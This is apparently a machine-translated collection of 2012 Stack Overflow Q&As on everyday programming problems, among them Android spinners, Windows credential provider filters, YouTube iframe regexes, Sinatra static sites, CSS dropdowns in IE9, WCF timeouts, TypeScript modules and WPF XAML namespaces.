如果您只是在启动时包装 $_GET、$_POST、$_REQUEST，那么您已经实现了您的目标。唯一的语法缺点是您不能再使用`empty($_POST)`，此类包装器仍允许所有其他原始数组访问。

# java - 在 onNavigationItemSelected 上获取微调器的项目文本

> ID：12954657
> 
> 赞同：1
> 
> 时间：2012-10-18T12:27:02.087
> 
> 标签：java, android, actionbarsherlock, android-spinner

我正在使用 ActionBarSherlock 显示微调器：

```
ActionBar bar = getSupportActionBar();
bar.setNavigationMode(ActionBar.NAVIGATION_MODE_LIST); 
```

我已经成功地从定义的字符串数组中获得微调器显示两个选项`strings.xml`：

```
SpinnerAdapter mSpinnerAdapter = ArrayAdapter.createFromResource(this, R.array.menu_list,
                  R.layout.sherlock_spinner_dropdown_item);

OnNavigationListener mOnNavigationListener = new OnNavigationListener() {

      @Override
      public boolean onNavigationItemSelected(int position, long itemId) {
       FragmentTransaction ft = getSupportFragmentManager().beginTransaction();  

       if(position==0)
       {
            CalendarFragment frag = new CalendarFragment();
            ft.replace(R.id.main, frag);

       }
       else
       {
            ConverterFragment frag = new ConverterFragment();
            ft.replace(R.id.main, frag);
       }
       ft.commit();

       return true;
      }
    };

bar.setListNavigationCallbacks(mSpinnerAdapter, mOnNavigationListener); 
```

`strings.xml`：

```
 <string-array name="menu_list">
        <item>Calendar</item>
        <item>Converter</item>
    </string-array> 
```

问题是我想获取所选数组项的文本并将另一个字符串添加到所选文本并显示为操作栏中的标题。

像这样的东西：

```
"SOMESTRING" + Calendar 
```

我不想在字符串数组本身中显示 SOMESTRING。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T13:44:48.743

您将需要创建自己的适配器类，加载您的数据，并覆盖`getView()`以填充`TextView`您修改的文本。这与创建自定义适配器以与常规`Spinner`.

# visual-c++ - 使用自定义凭据提供程序时，登录屏幕上出现多个磁贴

> ID：12954658
> 
> 赞同：0
> 
> 时间：2012-10-18T12:27:08.337
> 
> 标签：visual-c++, windows-7, winlogon, credential-providers

我已经使用 Microsoft 的 Credential Provider 示例为默认的 Windows 7 登录屏幕组合了一个包装器。

就新 CP 而言，一切似乎都运行良好，但我的登录屏幕上出现了重复的磁贴，即默认的 Windows 磁贴和我的“包装”磁贴。

如何删除默认的 Windows 磁贴，因为它不包含我的更改？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-19T07:35:53.273

**有两种可能的解决方案：**

1.**仔细查看** `GetCredentialCount`**您的提供商的功能**。
在包装现有提供者的情况下，在该函数中，您应该从底层提供者（被包装的提供者）获取凭证计数，并用您的凭证包装它们。也许，不知何故（由于代码中的逻辑错误）您制作了多个凭据副本。（我从未编写过包装器，但这种方法可能有意义）。

2.另一种方法是**通过实现****接口****来编写自己的。** ！如果您查看注册表项，您会发现在其他子项中有 2 个有趣的：和. 这就是它在我的电脑上的样子： 在`CredentialProviderFilter` **`ICredentialProviderFilter` **`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication``Credential Providers``Credential Provider Filters`

![](../Images/0772e98e1448f10dea1d94530c53e042.png)
`Credential Providers`列出了您 Windows 的所有凭据提供程序，其中有您自己的凭据提供程序。的想法`Credential Provider Filter`是过滤掉所有其他凭证提供者，除了你的。您可以通过 将您的凭证提供者与其他提供者区分开来`GUID`。
这个实现非常简单——你只需要从`ICredentialProviderFilter`接口实现一个方法。这种方法是`ICredentialProviderFilter::Filter`。**** 

 ****```
HRESULT MyProviderFilter::Filter(      
    CREDENTIAL_PROVIDER_USAGE_SCENARIO cpus,
    DWORD dwFlags,
    GUID *rgclsidProviders,
    BOOL *rgbAllow,
    DWORD cProviders)
{
    UNREFERENCED_PARAMETER(dwFlags);

    for (DWORD dwI = 0; dwI < cProviders; dwI++)
    {
        if (!IsEqualGUID(rgclsidProviders[dwI], myProviderGUID))
        {
            rgbAllow[dwI] = FALSE;
        } else rgbAllow[dwI] = TRUE;
    }
    return S_OK;
} 
```

因此，结果是，除了您的提供者之外，所有提供者都将被禁止。您可以在一个模块中实现`ICredentialProviderFilter`和。`ICredentialProvider`据我记得有一个用于凭据提供程序过滤器的示例`Microsoft Windows SDK`。

**祝你好运！******

# java - 正则表达式 YouTube IFRAME

> ID：12954660
> 
> 赞同：3
> 
> 时间：2012-10-18T12:27:31.627
> 
> 标签：java, php, android, regex, youtube

> **可能重复：**
> [如何使用 PHP 解析和处理 HTML？](https://stackoverflow.com/questions/3577641/how-to-parse-and-process-html-with-php)

我想发布一个适用于 android 的应用程序（wordpress 博客）。该应用程序还显示一些 YouTube 视频。我需要一种用 a - 标签替换 YouTube IFRAMES + EMBED-Codes（旧嵌入方法）的方法：

```
<iframe ...

<a href="http://www.youtube.com/watch?v=id"><img src="http://i1.ytimg.com/vi/id/hqdefault.jpg" /></a> 
```

替换：通过 php（服务器）或通过 java（eclipse）。我只找到了一些片段...

```
/embed\/([a-zA-Z0-9_-]{11})/ 
```

但我怎么能用它呢？请帮我！

**编辑：**我尝试替换以下代码：

```
<iframe width="560" height="315" src="http://www.youtube.com/embed/**ID**" frameborder="0" allowfullscreen></iframe> 
```

@斯蒂芬

```
$content = "contains <iframe... and article"
$search = '/<iframe.+?src="http://www.youtube.com/embed/([a-zA-Z0-9_-]{11})"[^>]+?></iframe>/i';
$replace = '<a href="http://www.youtube.com/watch?v=$1"><img src="http://i1.ytimg.com/vi/$1/hqdefault.jpg" /></a>';
$content = preg_replace($search, $replace, $content);
echo $content; 
```

我怎么能用它？错误：未知修饰符“/”（在 PHP 中）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:36:52.007

试试这个 ：

```
~<iframe.+?src="https?://www.youtube.com/embed/([a-zA-Z0-9_-]{11})"[^>]+?></iframe>~i 
```

**演示：**

> [https://regex101.com/r/2mjn1r/1](https://regex101.com/r/2mjn1r/1)

# ant - Ant 可以插入 cmd 行输入键值对来匹配属性文件吗？

> ID：12954663
> 
> 赞同：0
> 
> 时间：2012-10-18T12:27:37.867
> 
> 标签：ant, key-value

我有一个属性文件包括键值对：

```
key1=value1
key2=value2
... 
```

我有一个名为“计算”的 Ant 目标。我想通过引用这样的键来覆盖这些值：

```
ant compute -Dkey1=this is my value 
```

这怎么可能呢？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:33:30.727

尝试：

```
ant compute -Dkey1="this is my value" 
```

有很多方法可以实现这一点（通过`<input/>`任务要求用户输入，在全局属性中设置 var（在 Preferences->Ant 下）等），但我只知道 Eclipse 上的那些：S

顺便说一句，如果您想要更改每个设置的多个变量（例如环境设置），您可以使用不同的属性文件，例如 dev.properties、test.properties 和 prod.properties，然后对变量进行硬编码值到这些文件中。

然后你只需要一个参数，指定你想要选择的变量的“集合”（文件）......而且你的参数不会覆盖任何其他参数，它将直接在命令行中，比如

```
ant compute -Denv="test"
or
ant compute -Denv=test 
```

，这必须有效（除非 Ant 指南是错误的，我不这么认为）。

# javascript - 在 jquery 模板的 {{if}} 中调用 javascript 函数

> ID：12954666
> 
> 赞同：0
> 
> 时间：2012-10-18T12:27:50.933
> 
> 标签：javascript, jquery, jquery-templates

有一个javascript函数如下：

```
function test(item) {
       var DataToBeShownOnScreen = jQuery.data(document.body, "DataTobeShown");
       var found = $.inArray(item, DataToBeShownOnScreen) > -1;
       return found;
} 
```

我需要在我的 jquery 模板中调用这个函数，如下所示：

```
<script id="GridTemplate" type="text/html">
     <tbody>            
         {{each Data}} 
             <tr>
               {{each $value}} 
               {{if ${test($index)} }}                   
                   <td>${$value}</td>
               {{/if}}
               {{/each}}
             </tr>
          {{/each}} 
     </tbody>
</script> 
```

但我收到错误：

> 预期的标识符、字符串或数字

我需要帮助了解我在`{{if}}`模板中调用函数测试时犯了什么错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T05:41:53.267

我能够通过使用解决这个问题`{{if test($index)}} instead of {{if ${test($index)}}}.`

我猜的问题是`${test($index)}`会输出一个字符串而不是给出`true`或`false`作为`bool`。删除`${}`函数意味着我实际上得到了布尔值。

# ruby - 简单的“静态”Ruby 站点？

> ID：12954667
> 
> 赞同：0
> 
> 时间：2012-10-18T12:27:55.353
> 
> 标签：ruby, static

对于早期开发，我通常构建站点的静态版本。以前我会使用 PHP 并有类似...

```
images
javascripts
stylesheets
templates
-- header.php
-- footer.php
index.php
users.php 
```

并且将`index.php`有`users.php`一些基本的 PHP 包含这些页眉和页脚文件的代码。

我还获得了能够使用一些 PHP 函数的额外好处。

但是我已经很久没有使用 PHP 了，几乎只使用 Ruby ......所以我想知道，有没有办法在 Ruby 中实现类似这样的基本功能？

主要是寻找可以让我：

1.  做基本文件包括（所以我可以创建简单的模板）
2.  在文件中运行 Ruby

理想情况下，我也可以使用[LiveReload](http://livereload.com)。

附加细节：我在 OS X 上本地运行它，我通常使用[Pow](http://pow.cx)作为服务器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-21T22:13:22.713

Peter is right to recommend Sinatra. There are typically two types of Sinatra applications. Modular and classical. For your example, I'll create a classical application. It isn't much work to convert it to a modular if you find that style would better fit your needs.

You'll want to install the gem with `gem install sinatra`. Create a new directory for your project and two new files as follows:

```
# app.rb
require 'sinatra'

get '/' do
  erb :index
end

# config.ru
require './app'
run Sinatra::Application 
```

Create another directory called views and add this file:

```
# index.erb
Hello World! 
```

Then type ruby app.rb and viola, you now have a working project on `localhost:4567/`. To serve static files like css and js, just create a public directory. From there, any file will be able to accessed after the root url. So if you created a css folder, its respective url would be: `yourdomain.com/css/styles.css`.

So the entire directory would be as folllows:

```
app/
  app.rb
  config.ru
  public/
    css/
    js/
    images/
  views/
    index.erb 
```

Between the [Sinatra Book](http://sinatra-book.gittr.com/) and the [read me](http://www.sinatrarb.com/intro.html), you should be able to find all the info you need.

To accomplish the templates, you'll need something called [Sinatra Partial](https://github.com/yb66/Sinatra-Partial).

I'm not too familiar LiveReload but it seems like [Compass](http://compass-style.org/) accomplishes the same thing and has great integration with Sinatra. So long as pow is a rack based, you should have no problem using it.

Here is a [Sinatra Bootstrap](https://github.com/whatasunnyday/sinatra-bootstrapkk) I use for all my projects. It has Compass and Sinatra Partial preconfigured and makes it really easy to deploy with Heroku. It also uses Slim, Coffeescript, Thin (as the server), Twitter Bootstrap and Sass but it shouldn't be too much work to sub that with your respective favorites or remove them all together.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-11-24T11:51:16.433

I gifted my girlfriend a website with her domain name, I chose Jekyll for the job which uses RubyGems for the purpose.

It was easy and fun. Moreover you have lots of themes available which you can configure with .YML files just changing there will work for hole site. Although Linux or Mac OS is suggested by official Jekyll website but i did it in windows which was not much of a problem. They have steps defined for working on windows on their website.

```
http://jekyllrb.com/ 
```

The best part was that i could host the website via the git hub pages only. I didn't have to buy anything. Git hub allows you to host one repo. (funFact : Jekyll was developed by github inventor)

That's the one i used and made the website in 20 hours with no prior knowledge of Ruby and Jekyll. So i will suggest you check it out!

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:45:06.150

也许[Jekyll](http://jekyllrb.com/)符合要求？

其描述：

> Jekyll 是一个简单的、支持博客的、静态站点生成器。它需要一个模板目录（代表网站的原始形式），通过 Textile 或 Markdown 和 Liquid 转换器运行它，并输出一个适合与 Apache 或您喜欢的 Web 服务器一起服务的完整的静态网站。这也是 GitHub Pages 背后的引擎，您可以使用它在 GitHub 上托管您的项目页面或博客

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-18T16:40:17.927

是的，我为此使用 Sinatra，有关一些示例，请参阅[https://github.com/sinatra/sinatra/](https://github.com/sinatra/sinatra/)。在文件中运行 ruby​​ 并不是非常静态的，但在 Sinatra 中你可以两者都做。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-21T21:45:11.010

Jekyll won't leave you run Ruby code "inside" the files. Jekyll is a parsing engine bundled as a ruby gem. You basically code templates using HTML and Liquid and write content using markdown that gets embebed generating plain HTML files that you can upload to any web server.

# android - 使用 sqlite 进行 Android 测试中的数据驱动框架

> ID：12954676
> 
> 赞同：1
> 
> 时间：2012-10-18T12:28:27.263
> 
> 标签：android, sqlite, data-driven-tests

我正在实现一个数据驱动的框架来测试 Android 应用程序。测试数据库是 sqlite。我能够成功访问数据库。我试图参数化我的测试用例，以便我可以将测试数据作为单独的测试运行。但是作为类扩展 ActivityInstrumentationTestcase2 不允许我们在其中添加参数化构造函数。

我想使用`@RunWith`( `Parametrized.class`) 类并想创建一个函数 ( `@Parameters`) 来提供测试数据。我还需要每个测试都作为独立测试运行。我怎样才能做到这一点？

谁能帮我吗？

# html - 下拉菜单在 IE 9 中不起作用

> ID：12954679
> 
> 赞同：0
> 
> 时间：2012-10-18T12:28:34.850
> 
> 标签：html, css, drop-down-menu

我有一个基于 CSS 的下拉菜单，在 Firefox 和 Chrome 中效果很好，但是，在 IE 中，它的子菜单不会下拉。我让它工作了一段时间，但现在又不工作了。请帮忙！

网址：itsjust4me.com

CSS：

```
 body,ul,li{font-family:Arial,Helvetica,sans-serif;font-size:14px;text-align:left;}
    #menu{
    line-height:21px; 
    background:#ED7CD4;
    border-radius:8px 8px 0 0;
    -moz-border-radius:8px 8px 0 0; 
    -webkit-border-radius:8px 8px 0 0; 
    box-shadow:0 0 1px #EDF9FF inset;
    height:50px;
    list-style:none outside none;
    margin:0;
    padding:0 10px 0px 5px;
    z-index:50000;
    }

    #menu li{border:medium none;display:block;float:left;margin-right:2px;margin-top:10px;margin-bottom:-3px;padding:4px 10px;position:relative;text-align:center;}
    li.lessline{line-height:150%!important;margin-bottom:7px!important;}#menu li:hover{border-radius:5px 5px 0px 0px; background:#FCEFF9;border:1px solid #777777;padding:4px 9px;}#menu li a{color:#FFFFFF;display:block;font-family:Arial,Helvetica,sans-serif;font-size:15px;font-weight:400;outline:0 none;text-decoration:none;text-shadow:1px 1px 1px #000000;}#menu li:hover a{color:#B10D90;text-shadow:1px 1px 1px #FFFFFF;}#menu li .drop{background:url("img/drop.png") no-repeat scroll right 8px transparent;padding-right:21px;font-weight:700;}#menu li .noarrow{background:none!important;padding-right:0;font-weight:700;}#menu li:hover .drop{background:url("img/drop.png") no-repeat scroll right 7px transparent;}.dropdown_1column,.dropdown_2columns,.dropdown_3columns,.dropdown_4columns,.dropdown_5columns{-moz-border-bottom-colors:none;-moz-border-left-colors:none;-moz-border-right-colors:none;-moz-border-top-colors:none;background:#FCEFF9;border-color:-moz-use-text-color #777777 #777777;border-image:none;border-radius:0 5px 5px 5px;border-right:1px solid #777777;border-style:none solid solid;border-width:medium 1px 1px;float:left;left:-999em;margin:4px auto;padding:10px 5px;position:absolute;text-align:left;box-shadow:0px 12px 10px #000;-moz-box-shadow:0px 12px 10px #000;-webkit-box-shadow:0px 10px 10px #000;}.dropdown_1column{width:140px;}.dropdown_2columns{width:280px;}.dropdown_3columns{width:420px;}.dropdown_4columns{width:560px;}.dropdown_5columns{width:700px;}#menu li:hover .dropdown_1column,#menu li:hover .dropdown_2columns,#menu li:hover .dropdown_3columns,#menu li:hover .dropdown_4columns,#menu li:hover .dropdown_5columns{left:-1px;top:auto;}.col_1,.col_2,.col_3,.col_4,.col_5{display:inline;float:left;margin-left:5px;margin-right:5px;position:relative;}.col_1{width:130px;}.col_2{width:270px;}.col_3{width:410px;}.col_4{width:550px;}.col_5{width:690px;}#menu .menu_right{float:right;margin-right:0;}#menu li .align_right{border-radius:5px 0 5px 5px;}#menu li:hover .align_right{left:auto;right:-1px;top:auto;}#menu p,#menu h2,#menu h3,#menu ul li{font-family:Arial,Helvetica,sans-serif;font-size:12px;line-height:21px;text-align:left;text-shadow:1px 1px 1px #FFFFFF;}#menu h2{border-bottom:1px solid #B10D90;font-size:21px;font-weight:700;letter-spacing:-1px;margin:7px 0 14px;padding-bottom:14px;color:#B10D90;}#menu h3{border-bottom:1px solid #00ACED;font-size:14px;margin:7px 0 14px;padding-bottom:7px;color:#00ACED;}#menu p{line-height:18px;margin:0 0 10px;}#menu li:hover div a{color:#015B86;font-size:14px;}#menu li:hover div a:hover{color:#029FEB;}.strong{font-weight:bold;}.italic{font-style:italic;}.imgshadow{background:none repeat scroll 0 0 #FFFFFF;border:1px solid #777777;box-shadow:0 0 5px #666666;margin-top:5px;padding:4px;}.img_left{float:left;margin:5px 15px 5px 5px;width:auto;}#menu li .black_box{background-color:#333333;border-radius:5px 5px 5px 5px;box-shadow:0 0 3px #000000 inset;color:#EEEEEE;padding:4px 6px;text-shadow:1px 1px 1px #000000;}#menu li ul{list-style:none outside none;margin:0 0 12px;padding:0;}#menu li ul li{float:none;font-size:12px;line-height:24px;margin:0;padding:0;position:relative;text-align:left;text-shadow:1px 1px 1px #FFFFFF;width:130px;}#menu li ul li:hover{background:none repeat scroll 0 0 transparent;border:medium none;margin:0;padding:0;}#menu li .greybox li{background:none repeat scroll 0 0 #FFE0F8;border:1px solid #EDC4E3;border-radius:5px 5px 5px 5px;margin:0 0 4px;padding:4px 6px;width:116px;}#menu li .greybox li:hover{background:none repeat scroll 0 0 #FFFFFF;border:1px solid #AAAAAA;margin:0 0 4px;padding:4px 6px;}#menu .search{background:none!important;border:none!important;border-radius:0!important;padding:0!important; display:block;}#menu .search:hover{background:none!important;border:none!important;border-radius:0!important;padding:0!important;}
    #menu th {background:#F7D7EF;border-right:solid 1px rgb(232, 208, 226); border-bottom:solid 1px rgb(232, 208, 226); color:#B10D90 !important;}
    #menu td {border-bottom:dashed 1px rgb(232, 208, 226);}
    .menutableright {border-right:dashed 1px rgb(232, 208, 226);}
    .single {border-radius:5px 5px 5px 5px !important;} 
```

HTML

在头

```
 <link rel="stylesheet" type="text/css" href="../usermods/_INCstyles_.css" media="all">
    <link rel="stylesheet" type="text/css" href="../usermods/stylemy.css" media="all">
    <link rel="stylesheet" href="../menu/menu.css?v4" type="text/css" media="screen"/>
    <style>
    <!--[if IE]>
    body {
    background-color: #ED7ED7;
    background-image: url(images-common/bgrd.jpg);
    background-repeat: repeat-x;
    dropdown_4columns {width:56ypx !important;}
    behavior: url("http://wwww.itsjust4me.com/menu/csshover3.htc");
    }
    <![endif]--> 
    </style> 
```

在体内

```
 <ul id="menu">
    <li class="single"><a href="http://www.itsjust4me.com/Scripts/default.asp" class="drop noarrow">Home</a> 
    <li class="single"><a href="http://www.itsjust4me.com/content/Pages/Products.html" class="drop noarrow">Products</a> 
    <li><a href="http://www.itsjust4me.com/content/Pages/Products.html" class="drop">Shop By Category</a> 
    <div class="dropdown_4columns"> 
    <div class="col_1">
    <ul>
    <li class="lessline"><a href="http://www.itsjust4me.com/categories/Products/Personalized-Step-Stools.html">Personalized Step Stools</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/categories/Products/Personalized-CDs.html">Personalized CD's</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/categories/Products/Personalized-Name-Puzzles.html">Personalized Name Puzzles</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/categories/Products/Personalized-Coat-Racks.html">Personalized Coat Racks</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/Products/Personalized-Scrubs/Personalized-Kids-Scrubs.html">Personalized Kids Scrubs</a></li>
    </ul>
    </div>
    <div class="col_1">
    <ul>
    <li class="lessline"><a href="http://www.itsjust4me.com/categories/Products/Personalized-Name-Trains.html">Personalized Name Trains</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/Categories/Products/Personalized-Crayola-Gifts.html">Personalized Crayola</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/content/Pages/Personalized-Sports_Gifts.html">Personalized Sports Gifts</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/categories/Products/Quilted-Backpacks.html">Personalized Backpacks</a></li>
    <li class="lessline"><a href="http://www.itsjust4me.com/content/Pages/All-Fatheads.html">Fathead Decals</a></li>
    </ul>
    </div>
    <div class="col_2">
    <a href="http://www.itsjust4me.com/content/Pages/All-Fatheads.html" alt="Fathead Decals, Personalized Stools, Personalized CD's"/><img src="http://www.itsjust4me.com/prodimages/Fathead-Kids-sm.jpg" width="260" class="" alt="Fathead Decals" border="0"/></a>
    <span style="width:100%; height:2px;">&nbsp;</span>
    </div>
    <div class="col_4">
    <div class="col_2" style="width:265px !important;">
    <a href="http://www.itsjust4me.com/categories/Products/Personalized-Step-Stools.html"><img src="http://www.itsjust4me.com/prodimages/Personalized-Stools-Img1.png" width="260" class="" alt="Personalized CD's, Personalized Stools" border="0"/></a>
    </div>
    <div class="col_2" style="width:265px !important;">
    <a href="http://www.itsjust4me.com/categories/Products/Personalized-CDs.html"><img src="http://www.itsjust4me.com/Scripts/images-common/hpcd.jpg" width="260" class="" alt="Personalized CD's, Personalized Stools" border="0"/></a></div>
    </div>
    </div>
    </li>
    <li><a href="#" class="drop">Shop By Theme</a> 
    <div class="dropdown_2columns"> 
    <div class="col_2">
    <h2>Coming Soon</h2>
    </div>
    </div> 
    </li> 
    <li class="single"><a href="http://www.itsjust4me.com/content/Pages/FAQ.html" class="drop noarrow">FAQ</a></li>
    <li><a href="#" class="drop">Shipping</a>
    <div class="dropdown_4columns align_right"> 
    <div class="col_4">
    <H2>Product Delivery Times</H2>
    </div>
    <div class="col_4">
    <table style="width: 100%; margin-top:-5px;">
    <tr>
    <th align="center">Product Type</th>
    <th align="center">Manufacturing / Processing</th>
    <th align="center" style="border-right:none !important;">Shipping</th>
    </tr>
    <tr onMouseOver="this.bgColor='#F7D7EF';" onMouseOut="this.bgColor='#FCEFF9';">
    <th align="center">Personalized CDs</th>
    <td align="center" class="menutableright">2-3 Days</td>
    <td align="center">3-4 Days</td>
    </tr>
    <tr onMouseOver="this.bgColor='#F7D7EF';" onMouseOut="this.bgColor='#FCEFF9';">
    <th align="center">Personalized Books</th>
    <td align="center" class="menutableright">2-3 Days</td>
    <td align="center">3-4 Days</td>
    </tr>
    <tr onMouseOver="this.bgColor='#F7D7EF';" onMouseOut="this.bgColor='#FCEFF9';">
    <th align="center">Personalized Step Stools</th>
    <td align="center" class="menutableright">3-5 Weeks</td>
    <td align="center">3-4 Days</td>
    </tr>
    <tr onMouseOver="this.bgColor='#F7D7EF';" onMouseOut="this.bgColor='#FCEFF9';">
    <th align="center">Personalized Name Boards</th>
    <td align="center" class="menutableright">3-5 Weeks</td>
    <td align="center">3-4 Days</td>
    </tr>
    <tr onMouseOver="this.bgColor='#F7D7EF';" onMouseOut="this.bgColor='#FCEFF9';">
    <th align="center">Personalized Coat Racks</th>
    <td align="center" class="menutableright">3-5 Weeks</td>
    <td align="center">3-4 Days</td>
    </tr>
    <tr onMouseOver="this.bgColor='#F7D7EF';" onMouseOut="this.bgColor='#FCEFF9';">
    <th align="center">Personalized Clocks</th>
    <td align="center" class="menutableright">5-7 Days</td>
    <td align="center">3-4 Days</td>
    </tr>
    <tr onMouseOver="this.bgColor='#F7D7EF';" onMouseOut="this.bgColor='#FCEFF9';">
    <th align="center">Personalized Name Trains</th>
    <td align="center" class="menutableright">2-5 Days</td>
    <td align="center">3-4 Days</td>
    </tr>
    </table>
    </div>
    </div> 
    </li>
    <li class="menu_right search"><form method="post" action="/scripts/chshowinfo.php" style="width:156px !important;">
    <input name="txtsearch" id="txtsearch" style="border: 1px solid rgb(177, 13, 144); border-radius: 4px 4px 4px 4px; text-align: left; margin-top: 3px;  padding: 4px 0px 4px 2px;" placeholder="Search Products" type="text" value=""/>
    </form>
    </li>

    </ul> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T03:21:44.170

@Sven 你正中头！DOCTYPE 已声明，但它被放置在一些 ASP 包含的下方......将它移到页面顶部并且它成功了！

# wcf - 更改每个 WCF 方法或调用的超时

> ID：12954680
> 
> 赞同：6
> 
> 时间：2012-10-18T12:28:40.877
> 
> 标签：wcf, timeout, n-tier-architecture

我有一个相当大的“旧”WCF 服务，有许多不同的方法。

这些方法中的大多数都是“正常”的，因此它们应该在 10 秒内回答，但是有几种方法（8 或 9）是长时间的过程，因此它们可能需要很长时间才能得到响应。

接收超时和发送超时设置为 00:40:00，以确保他们有足够的时间来完成这些过程。

问题是有时我们会遇到连接问题，并且“正常”方法需要很长时间才能崩溃......

他们都在同一个服务中，因为他们使用了一个非常大的模型，并且他们希望在每次调用中重用服务中的模型（没有 PersonsService.User 和 RobotsService.User... 因为它们是不同的同一个类服务）。

我想的第一个解决方案是用那些长流程创建一个不同的服务，并为正常服务设置一个短的超时时间......但由于模型的使用，我应该做很多改变......

有没有办法在每次通话中设置不同的超时时间？还是通过服务方式？无论如何我应该分块服务吗？

提前致谢！！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-18T18:39:13.147

首先，在您的情况下配置的超时时间是`OperationTimeout`，它允许在超时之前等待服务回复的时间限制。您可以在从客户端进行调用之前修改*操作超时。*

要`OperationTimeout`在通道上设置 ，您可以键入您的代理/通道实例为`IContextChannel`并设置`OperationTimeout`。

例如：

```
IClientChannel contextChannel = channel as IClientChannel;
contextChannel.OperationTimeout = TimeSpan.FromMinutes(10); 
```

HTH，阿米特

# typescript - ASP.NET MVC 和 HTML TypeScript 项目的区别

> ID：12954684
> 
> 赞同：0
> 
> 时间：2012-10-18T12:28:45.737
> 
> 标签：typescript

我有一个问题，我想来自我使用 Type Script 的 ASP.NET MVC 项目。为了进行测试，我使用 HTML TypeScript 模板创建了一个项目。我可以完美地创建两个模块并在另一个模块中使用其中一个，如下所示：

```
import authModule = module("Authenticate");
import testModule = module("TestModule");

export module SiteMaster {
  authModule.Authenticate.run();
  testModule.TestModule.run();
} 
```

它正在正确生成这样的 JavaScript：

```
define(["require", "exports", "Authenticate", "TestModule"], function(require, exports, __authModule__, __testModule__) {
  var authModule = __authModule__;
  var testModule = __testModule__;

  (function (SiteMaster) {
    authModule.Authenticate.run();
    testModule.TestModule.run();
  })(exports.SiteMaster || (exports.SiteMaster = {}));
}) 
```

然后我将我的 Typescript 项目中的编译器命令复制到我的 ASP.NET MVC 4.5。

```
 <Target Name="BeforeBuild">
<Exec Command="&quot;$(PROGRAMFILES)\Microsoft SDKs\TypeScript\0.8.0.0\tsc&quot; --module amd @(TypeScriptCompile ->'&quot;%(fullpath)&quot;', ' ')" /> 
```

它正在正确编译。显然编译正确。

但是有一个问题：当我在我的 ASP.NET MVC 应用程序中创建相同的模块时，我在导入行中收到编译错误：

```
The name '"Authenticate"' does not exist in the current scope
A module cannot be aliased to a non-module 
```

TestModule 也是如此。

我在下面包含了对该模块的引用，但错误仍然存​​在，并在 Typescript 模板中查看该引用不是必需的。

```
/// <reference path='Authenticate.ts'/> 
```

这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:40:15.000

我想我已经解决了这个问题。正如我怀疑它在编译器命令中。事实上，我并没有使用编译器命令生成 TypeScript 模板。

我在我的 ASP.NET MVC 项目中使用了这个命令：

```
 <Target Name="BeforeBuild">
<Exec Command="&quot;$(PROGRAMFILES)\Microsoft SDKs\TypeScript\0.8.0.0\tsc&quot; --module amd -target ES5 @(TypeScriptCompile ->'&quot;%(fullpath)&quot;', ' ')" IgnoreExitCode="true" /> 
```

这个编译器命令在这里工作：

```
 <Target Name="BeforeBuild">
<Exec Command="&quot;$(PROGRAMFILES)\Microsoft SDKs\TypeScript\0.8.0.0\tsc&quot; --module amd @(TypeScriptCompile ->'&quot;%(fullpath)&quot;', ' ')" /> 
```

有人可以解释一下目标参数的含义是什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T14:41:45.530

如果您使用的是 ASP.NET 4.5，我个人建议使用捆绑包，而不是 AMD 模块加载 - 除非您有令人信服的理由不这样做。

`--module amd`从 Exec 配置中删除并将您的语句`import`转换为`/// <reference path=`语句并在 bundle_config 中设置您的包。

如果你的目标是 ES5，你可以使用：

```
--target ES5 
```

但只有在使用 getter 和 setter 时才需要这样做，这是唯一不能在 ECMAScript 3 上运行的 TypeScript 语言功能。

# wpf - 同一个程序集中可以有多个 XmlnsPrefix 吗？

> ID：12954685
> 
> 赞同：1
> 
> 时间：2012-10-18T12:28:49.410
> 
> 标签：wpf, xaml, markup

我正在开发一个自定义 WPF 控件库，其中包括分布在适当命名空间中的控件转换器、触发器和行为。我知道如何定义 XmlnsDefinition 和 XmlnsPrefix 程序集信息并广泛使用它。Hwta 我想做的是为同一个程序集中的每个命名空间定义 XmlnsPrefix 所以 ForExample 如果有这样的声明

```
[assembly: XmlnsPrefix("http://schemas.taicodev.com/winfx/2010/xaml/presentation", "TaicoControl")]
[assembly: XmlnsDefinition("http://schemas.taicodev.com/winfx/2010/xaml/presentation", "CuratioCMS.Client.UI.Converters")]
[assembly: XmlnsDefinition("http://schemas.taicodev.com/winfx/2010/xaml/presentation", "CuratioCMS.Client.UI.Controls")] 
```

我想离开 TaicoControl 但转换器自动使用 TaicoConverter 前缀

这是可能的吗？如何在没有在许多不同组件中划分组件的情况下实现这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:34:38.090

如果您希望 2 个不同的 CLR 命名空间使用 2 个不同的 xmlns 前缀，那么您需要为每个 CLR 命名空间定义 xmlnsdefinition 以便它使用不同的 URI，然后为每个唯一的 URI 定义一个 xmlnsprefix。

```
[assembly: XmlnsPrefix("http://schemas.taicodev.com/winfx/2010/xaml/presentation", "TaicoControl")]
[assembly: XmlnsPrefix("http://schemas.taicodev.com/winfx/2010/xaml/presentation/converters", "TaicoConverters")]
[assembly: XmlnsDefinition("http://schemas.taicodev.com/winfx/2010/xaml/presentation/converters", "CuratioCMS.Client.UI.Converters")]
[assembly: XmlnsDefinition("http://schemas.taicodev.com/winfx/2010/xaml/presentation", "CuratioCMS.Client.UI.Controls")] 
```

